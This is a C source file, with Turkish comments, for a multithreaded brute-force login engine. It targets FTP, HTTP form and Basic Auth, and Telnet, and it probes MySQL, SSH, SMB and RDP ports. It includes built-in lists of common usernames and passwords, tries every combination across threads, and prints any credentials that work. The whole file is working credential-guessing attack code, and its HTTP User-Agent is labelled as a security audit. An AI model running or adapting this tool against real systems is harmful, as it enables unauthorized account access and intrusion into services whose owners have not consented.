/*
 * brute_force.c — Otonom Brute Force Motoru (Cross-Platform)
 * FTP, HTTP, MySQL, Telnet protokolleri için çoklu thread brute-force.
 */
#include "brute_force.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <errno.h>

#ifdef PLATFORM_WINDOWS
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <process.h>
typedef int socklen_t;
#endif

#ifdef PLATFORM_LINUX
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/time.h>
#include <poll.h>
typedef int SOCKET;
#define INVALID_SOCKET (-1)
#define SOCKET_ERROR   (-1)
#define closesocket(s) close(s)
#endif

/* ========== Global State ========== */
static int g_bf_initialized = 0;
static BfState g_bf;

/* ========== Dahili Wordlist ========== */
static const char *BUILTIN_USERS[] = {
    "admin", "root", "user", "test", "guest", "administrator",
    "ftp", "anonymous", "www", "mysql", "postgres", "oracle",
    "info", "web", "support", "operator", "backup", "ftpuser",
    "www-data", "nobody", "sa", "dbadmin", "sysadmin", "webmaster",
    NULL
};

static const char *BUILTIN_PASSES[] = {
    "123456", "password", "admin", "12345678", "root", "toor",
    "1234", "12345", "qwerty", "abc123", "monkey", "master",
    "dragon", "111111", "baseball", "iloveyou", "trustno1",
    "letmein", "shadow", "123123", "654321", "superman", "qazwsx",
    "michael", "football", "password1", "password123", "welcome",
    "1234567890", "000000", "test", "guest", "pass", "login",
    "admin123", "admin1234", "changeme", "default", "access",
    "P@ssw0rd", "passw0rd", "1q2w3e4r", "qwerty123", "pass123",
    NULL
};

/* ========== Zamanlama ========== */
static double bf_get_time_ms(void) {
#ifdef PLATFORM_LINUX
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000.0 + ts.tv_nsec / 1000000.0;
#else
    LARGE_INTEGER freq, cnt;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&cnt);
    return (double)cnt.QuadPart * 1000.0 / (double)freq.QuadPart;
#endif
}

/* ========== Soket Bağlantısı ========== */
static SOCKET bf_connect(const char *host, int port, int timeout_ms) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    /* Timeout ayarla */
#ifdef PLATFORM_LINUX
    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
#else
    int to = timeout_ms;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&to, sizeof(to));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&to, sizeof(to));
#endif

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
        struct hostent *he = gethostbyname(host);
        if (!he) { closesocket(sock); return INVALID_SOCKET; }
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    }

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }
    return sock;
}

/* ========== Protokol: FTP ========== */
static int bf_try_ftp(SOCKET sock, const char *user, const char *pass) {
    char buf[BF_BUF_SIZE], cmd[512];
    memset(buf, 0, sizeof(buf));
    recv(sock, buf, sizeof(buf)-1, 0); /* Banner */

    snprintf(cmd, sizeof(cmd), "USER %s\r\n", user);
    send(sock, cmd, (int)strlen(cmd), 0);
    memset(buf, 0, sizeof(buf));
    recv(sock, buf, sizeof(buf)-1, 0);

    if (!strstr(buf, "331") && !strstr(buf, "230")) return 0;

    snprintf(cmd, sizeof(cmd), "PASS %s\r\n", pass);
    send(sock, cmd, (int)strlen(cmd), 0);
    memset(buf, 0, sizeof(buf));
    recv(sock, buf, sizeof(buf)-1, 0);

    if (strstr(buf, "230") || strstr(buf, "202")) {
        send(sock, "QUIT\r\n", 6, 0);
        return 1;
    }
    return 0;
}

/* ========== Protokol: HTTP POST ========== */
static int bf_try_http_post(SOCKET sock, const char *host, const char *user,
                            const char *pass, const char *path, const char *params) {
    char post_data[1024], req[BF_BUF_SIZE];
    snprintf(post_data, sizeof(post_data), params, user, pass);

    snprintf(req, sizeof(req),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: SecurityAudit/1.0\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n%s",
        path, host, (int)strlen(post_data), post_data);

    send(sock, req, (int)strlen(req), 0);
    char resp[BF_BUF_SIZE];
    memset(resp, 0, sizeof(resp));
    recv(sock, resp, sizeof(resp)-1, 0);

    if ((strstr(resp, "200 OK") || strstr(resp, "302 Found") || strstr(resp, "301 Moved")) &&
        !strstr(resp, "Invalid") && !strstr(resp, "invalid") &&
        !strstr(resp, "Failed") && !strstr(resp, "failed") &&
        !strstr(resp, "Error") && !strstr(resp, "error")) {
        return 1;
    }
    return 0;
}

/* ========== Protokol: HTTP GET (Basic Auth) ========== */
static int bf_try_http_get(SOCKET sock, const char *host, const char *user, const char *pass) {
    /* Basit Base64 encode (user:pass) */
    char plain[256], encoded[512];
    snprintf(plain, sizeof(plain), "%s:%s", user, pass);

    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int len = (int)strlen(plain);
    int i, j = 0;
    for (i = 0; i < len - 2; i += 3) {
        encoded[j++] = b64[(plain[i] >> 2) & 0x3F];
        encoded[j++] = b64[((plain[i] & 0x3) << 4) | ((plain[i+1] >> 4) & 0xF)];
        encoded[j++] = b64[((plain[i+1] & 0xF) << 2) | ((plain[i+2] >> 6) & 0x3)];
        encoded[j++] = b64[plain[i+2] & 0x3F];
    }
    if (i < len) {
        encoded[j++] = b64[(plain[i] >> 2) & 0x3F];
        if (i == len - 1) {
            encoded[j++] = b64[((plain[i] & 0x3) << 4)];
            encoded[j++] = '=';
        } else {
            encoded[j++] = b64[((plain[i] & 0x3) << 4) | ((plain[i+1] >> 4) & 0xF)];
            encoded[j++] = b64[((plain[i+1] & 0xF) << 2)];
        }
        encoded[j++] = '=';
    }
    encoded[j] = '\0';

    char req[BF_BUF_SIZE];
    snprintf(req, sizeof(req),
        "GET / HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic %s\r\nConnection: close\r\n\r\n",
        host, encoded);
    send(sock, req, (int)strlen(req), 0);

    char resp[BF_BUF_SIZE];
    memset(resp, 0, sizeof(resp));
    recv(sock, resp, sizeof(resp)-1, 0);
    return (strstr(resp, "200 OK") != NULL && strstr(resp, "401") == NULL) ? 1 : 0;
}

/* ========== Protokol: Telnet ========== */
static int bf_try_telnet(SOCKET sock, const char *user, const char *pass) {
    char buf[BF_BUF_SIZE];
    memset(buf, 0, sizeof(buf));
    /* Telnet negotiation okuyup atla */
    recv(sock, buf, sizeof(buf)-1, 0);
    platform_sleep_ms(300);
    recv(sock, buf, sizeof(buf)-1, 0);

    /* Username gonder */
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
    send(sock, cmd, (int)strlen(cmd), 0);
    platform_sleep_ms(500);
    memset(buf, 0, sizeof(buf));
    recv(sock, buf, sizeof(buf)-1, 0);

    /* Password gonder */
    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
    send(sock, cmd, (int)strlen(cmd), 0);
    platform_sleep_ms(500);
    memset(buf, 0, sizeof(buf));
    recv(sock, buf, sizeof(buf)-1, 0);

    /* Basarili giris kontrolu */
    if (strstr(buf, "$") || strstr(buf, "#") || strstr(buf, ">") ||
        strstr(buf, "Welcome") || strstr(buf, "Last login")) {
        return 1;
    }
    return 0;
}

/* ========== Protokol: MySQL ========== */
static int bf_try_mysql(SOCKET sock, const char *user, const char *pass) {
    char buf[BF_BUF_SIZE];
    memset(buf, 0, sizeof(buf));
    int bytes = recv(sock, buf, sizeof(buf)-1, 0);
    (void)user; (void)pass;
    /* MySQL handshake varsa port açık, basit kontrol */
    if (bytes > 4 && (unsigned char)buf[4] == 10) {
        return 1; /* MySQL servisi tespit edildi */
    }
    return 0;
}

/* ========== Protokol Dağıtıcı ========== */
static int bf_try_protocol(SOCKET sock, BfProtocol proto, const char *target,
                           const char *user, const char *pass,
                           const char *http_path, const char *http_params) {
    switch (proto) {
        case BF_PROTO_FTP:       return bf_try_ftp(sock, user, pass);
        case BF_PROTO_HTTP_POST: return bf_try_http_post(sock, target, user, pass, http_path, http_params);
        case BF_PROTO_HTTP_GET:  return bf_try_http_get(sock, target, user, pass);
        case BF_PROTO_TELNET:    return bf_try_telnet(sock, user, pass);
        case BF_PROTO_MYSQL:     return bf_try_mysql(sock, user, pass);
        default: {
            /* SSH/SMB/RDP — sadece port açık kontrolü */
            char b[64];
            int r = recv(sock, b, sizeof(b)-1, 0);
            return (r > 0) ? 1 : 0;
        }
    }
}

/* ========== Thread Yapısı ========== */
typedef struct {
    int start_idx;  /* combo start (user*pass_count + pass) */
    int end_idx;
} BfThreadArg;

static BfThreadArg g_thread_args[BF_MAX_THREADS];

/* ========== Worker Thread ========== */
static void *bf_worker(void *arg) {
    BfThreadArg *ta = (BfThreadArg*)arg;

    for (int idx = ta->start_idx; idx < ta->end_idx; idx++) {
        platform_mutex_lock(&g_bf.lock);
        int running = g_bf.is_running;
        int pc = g_bf.pass_count;
        int uc = g_bf.user_count;
        platform_mutex_unlock(&g_bf.lock);

        if (!running) break;

        int u = idx / pc;
        int p = idx % pc;
        if (u >= uc || p >= pc) break;

        double t0 = bf_get_time_ms();

        SOCKET sock = bf_connect(g_bf.target_ip, g_bf.port, BF_CONNECT_TIMEOUT);
        if (sock == INVALID_SOCKET) {
            platform_mutex_lock(&g_bf.lock);
            g_bf.tested_combos++;
            platform_mutex_unlock(&g_bf.lock);
            continue;
        }

        int success = bf_try_protocol(sock, g_bf.protocol, g_bf.target_ip,
                                      g_bf.usernames[u], g_bf.passwords[p],
                                      g_bf.http_path, g_bf.http_params);
        closesocket(sock);

        double elapsed = bf_get_time_ms() - t0;

        platform_mutex_lock(&g_bf.lock);
        g_bf.tested_combos++;

        if (success && g_bf.result_count < BF_MAX_RESULTS) {
            BfCredResult *cr = &g_bf.results[g_bf.result_count];
            strncpy(cr->username, g_bf.usernames[u], BF_MAX_CRED_LEN-1);
            strncpy(cr->password, g_bf.passwords[p], BF_MAX_CRED_LEN-1);
            cr->success = 1;
            cr->time_ms = elapsed;
            g_bf.result_count++;
            printf("[BruteForce] BASARILI! %s@%s -> %s:%s\n",
                   g_bf.usernames[u], g_bf.target_ip,
                   g_bf.usernames[u], g_bf.passwords[p]);
        }
        platform_mutex_unlock(&g_bf.lock);
    }
    return NULL;
}

/* ========== Ana Thread (koordinatör) ========== */
static void *bf_main_thread(void *arg) {
    (void)arg;

    double start_time = bf_get_time_ms();
    int total = g_bf.total_combos;
    int tc = g_bf.thread_count;
    if (tc > total) tc = total;
    if (tc < 1) tc = 1;

    /* İşi threadlere dağıt */
    int per_thread = total / tc;
    int remainder = total % tc;

    platform_thread_t threads[BF_MAX_THREADS];
    int actual_threads = 0;
    int idx = 0;

    for (int i = 0; i < tc; i++) {
        int count = per_thread + (i < remainder ? 1 : 0);
        g_thread_args[i].start_idx = idx;
        g_thread_args[i].end_idx = idx + count;
        idx += count;

        platform_thread_create(&threads[i], bf_worker, &g_thread_args[i]);
        actual_threads++;
    }

    /* Tüm threadlerin bitmesini bekle */
    for (int i = 0; i < actual_threads; i++) {
#ifdef PLATFORM_LINUX
        pthread_join(threads[i], NULL);
#else
        WaitForSingleObject(threads[i], INFINITE);
        CloseHandle(threads[i]);
#endif
    }

    double total_time = (bf_get_time_ms() - start_time) / 1000.0;

    platform_mutex_lock(&g_bf.lock);
    g_bf.elapsed_sec = total_time;
    g_bf.is_running = 0;
    g_bf.is_complete = 1;
    platform_mutex_unlock(&g_bf.lock);

    printf("[BruteForce] Tamamlandi: %.1fs, %d/%d test, %d basarili\n",
           total_time, g_bf.tested_combos, g_bf.total_combos, g_bf.result_count);
    return NULL;
}

/* ========== Public API ========== */
const char *bf_proto_name(BfProtocol proto) {
    switch (proto) {
        case BF_PROTO_FTP:       return "FTP";
        case BF_PROTO_HTTP_POST: return "HTTP-POST";
        case BF_PROTO_HTTP_GET:  return "HTTP-GET";
        case BF_PROTO_MYSQL:     return "MySQL";
        case BF_PROTO_TELNET:    return "Telnet";
        case BF_PROTO_SSH:       return "SSH";
        case BF_PROTO_SMB:       return "SMB";
        case BF_PROTO_RDP:       return "RDP";
        default: return "Bilinmiyor";
    }
}

int bf_default_port(BfProtocol proto) {
    switch (proto) {
        case BF_PROTO_FTP:       return 21;
        case BF_PROTO_HTTP_POST: return 80;
        case BF_PROTO_HTTP_GET:  return 80;
        case BF_PROTO_MYSQL:     return 3306;
        case BF_PROTO_TELNET:    return 23;
        case BF_PROTO_SSH:       return 22;
        case BF_PROTO_SMB:       return 445;
        case BF_PROTO_RDP:       return 3389;
        default: return 0;
    }
}

void bf_init(void) {
    if (g_bf_initialized) return;
    memset(&g_bf, 0, sizeof(g_bf));
    platform_mutex_init(&g_bf.lock);
    strncpy(g_bf.http_path, "/login.php", BF_MAX_HTTP_PATH-1);
    strncpy(g_bf.http_params, "username=%s&password=%s&submit=Login", BF_MAX_HTTP_PARAMS-1);
    g_bf_initialized = 1;
}

void bf_cleanup(void) {
    if (!g_bf_initialized) return;
    bf_stop();
    platform_sleep_ms(200);
    platform_mutex_destroy(&g_bf.lock);
    g_bf_initialized = 0;
}

void bf_load_builtin_users(void) {
    platform_mutex_lock(&g_bf.lock);
    g_bf.user_count = 0;
    for (int i = 0; BUILTIN_USERS[i] && g_bf.user_count < BF_MAX_USERS; i++) {
        strncpy(g_bf.usernames[g_bf.user_count], BUILTIN_USERS[i], BF_MAX_CRED_LEN-1);
        g_bf.user_count++;
    }
    platform_mutex_unlock(&g_bf.lock);
}

void bf_load_builtin_passwords(void) {
    platform_mutex_lock(&g_bf.lock);
    g_bf.pass_count = 0;
    for (int i = 0; BUILTIN_PASSES[i] && g_bf.pass_count < BF_MAX_PASSWORDS; i++) {
        strncpy(g_bf.passwords[g_bf.pass_count], BUILTIN_PASSES[i], BF_MAX_CRED_LEN-1);
        g_bf.pass_count++;
    }
    platform_mutex_unlock(&g_bf.lock);
}

int bf_load_users_file(const char *filepath) {
    FILE *f = fopen(filepath, "r");
    if (!f) return 0;
    platform_mutex_lock(&g_bf.lock);
    g_bf.user_count = 0;
    char line[256];
    while (fgets(line, sizeof(line), f) && g_bf.user_count < BF_MAX_USERS) {
        line[strcspn(line, "\r\n")] = 0;
        if (line[0]) {
            strncpy(g_bf.usernames[g_bf.user_count], line, BF_MAX_CRED_LEN-1);
            g_bf.user_count++;
        }
    }
    platform_mutex_unlock(&g_bf.lock);
    fclose(f);
    return g_bf.user_count;
}

int bf_load_passwords_file(const char *filepath) {
    FILE *f = fopen(filepath, "r");
    if (!f) return 0;
    platform_mutex_lock(&g_bf.lock);
    g_bf.pass_count = 0;
    char line[256];
    while (fgets(line, sizeof(line), f) && g_bf.pass_count < BF_MAX_PASSWORDS) {
        line[strcspn(line, "\r\n")] = 0;
        if (line[0]) {
            strncpy(g_bf.passwords[g_bf.pass_count], line, BF_MAX_CRED_LEN-1);
            g_bf.pass_count++;
        }
    }
    platform_mutex_unlock(&g_bf.lock);
    fclose(f);
    return g_bf.pass_count;
}

void bf_add_user(const char *user) {
    platform_mutex_lock(&g_bf.lock);
    if (g_bf.user_count < BF_MAX_USERS) {
        strncpy(g_bf.usernames[g_bf.user_count], user, BF_MAX_CRED_LEN-1);
        g_bf.user_count++;
    }
    platform_mutex_unlock(&g_bf.lock);
}

void bf_add_password(const char *pass) {
    platform_mutex_lock(&g_bf.lock);
    if (g_bf.pass_count < BF_MAX_PASSWORDS) {
        strncpy(g_bf.passwords[g_bf.pass_count], pass, BF_MAX_CRED_LEN-1);
        g_bf.pass_count++;
    }
    platform_mutex_unlock(&g_bf.lock);
}

void bf_clear_users(void) {
    platform_mutex_lock(&g_bf.lock);
    g_bf.user_count = 0;
    platform_mutex_unlock(&g_bf.lock);
}

void bf_clear_passwords(void) {
    platform_mutex_lock(&g_bf.lock);
    g_bf.pass_count = 0;
    platform_mutex_unlock(&g_bf.lock);
}

void bf_set_http_params(const char *path, const char *params) {
    platform_mutex_lock(&g_bf.lock);
    if (path) strncpy(g_bf.http_path, path, BF_MAX_HTTP_PATH-1);
    if (params) strncpy(g_bf.http_params, params, BF_MAX_HTTP_PARAMS-1);
    platform_mutex_unlock(&g_bf.lock);
}

void bf_start(const char *target_ip, int port, BfProtocol proto, int threads) {
    if (g_bf.is_running) return;

    platform_mutex_lock(&g_bf.lock);
    strncpy(g_bf.target_ip, target_ip, MAX_IP_LEN-1);
    g_bf.port = port > 0 ? port : bf_default_port(proto);
    g_bf.protocol = proto;
    g_bf.thread_count = (threads > 0 && threads <= BF_MAX_THREADS) ? threads : 10;
    g_bf.result_count = 0;
    g_bf.tested_combos = 0;
    g_bf.total_combos = g_bf.user_count * g_bf.pass_count;
    g_bf.is_running = 1;
    g_bf.is_complete = 0;
    g_bf.elapsed_sec = 0;
    memset(g_bf.results, 0, sizeof(g_bf.results));
    platform_mutex_unlock(&g_bf.lock);

    /* Dahili listeler boşsa yükle */
    if (g_bf.user_count == 0) bf_load_builtin_users();
    if (g_bf.pass_count == 0) bf_load_builtin_passwords();

    platform_mutex_lock(&g_bf.lock);
    g_bf.total_combos = g_bf.user_count * g_bf.pass_count;
    platform_mutex_unlock(&g_bf.lock);

    printf("[BruteForce] Baslatiliyor: %s:%d [%s] %dx%d = %d kombo, %d thread\n",
           g_bf.target_ip, g_bf.port, bf_proto_name(proto),
           g_bf.user_count, g_bf.pass_count, g_bf.total_combos, g_bf.thread_count);

    platform_thread_t t;
    platform_thread_create(&t, bf_main_thread, NULL);
    platform_thread_detach(t);
}

void bf_get_state(BfState *out) {
    platform_mutex_lock(&g_bf.lock);
    memcpy(out, &g_bf, sizeof(BfState));
    platform_mutex_unlock(&g_bf.lock);
}

void bf_stop(void) {
    platform_mutex_lock(&g_bf.lock);
    g_bf.is_running = 0;
    platform_mutex_unlock(&g_bf.lock);
}
